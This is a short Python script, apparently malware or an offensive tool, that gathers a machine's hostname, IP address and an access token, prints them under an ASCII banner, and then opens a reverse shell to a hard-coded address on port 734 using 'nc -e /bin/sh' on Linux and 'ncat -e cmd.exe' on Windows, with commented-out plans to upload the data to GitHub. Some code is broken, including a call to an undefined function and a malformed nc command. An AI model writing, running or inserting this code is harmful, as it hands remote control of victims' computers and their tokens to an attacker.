import platform
import os
import sysconfig
import socket
import json
import base64
import requests
try:
    from github import Github
except:
	os.system('python -m pip install PyGithub')


def create_file(file_path, content):
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(content)

def delete_file(file_path):
    os.remove(file_path)

def upload_File(filename,sha=None):
	updated=False
	new_sha,content=downloadFile(filename)
	if (not sha or sha!=new_sha) and (new_sha):
		file=open(filename,'w')
		file.write(content)
		file.close()
		updated=True
		print('[!] Updating '+filename)
	return updated,new_sha

        

def run(token):
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph='192.168.1.212'
    fname="data.txt"
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
        print(' IpAddress: ', IPAddr)
        print('TokenData: ', token)
        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
        print('tokenData: '+ stmnt)
        #upload_file_to_github(archive)
        #os.system( 'nc -lvp 734 -e /bin/sh')
        os.system('nc' + iph+ ' 734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
        print('Address ip: ', IPAddr)
        print('TokenData: ', token)
        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
        print("text stmnt: "+ stmnt)
        create_file(fname,stmnt)
        #pdate_file(token,fname)
        #delete_file(fname)
        
        #os.system('ncat -lvp 734 -e cmd.exe')
        
        os.system('ncat '+ iph +' 734 -e cmd.exe')
    
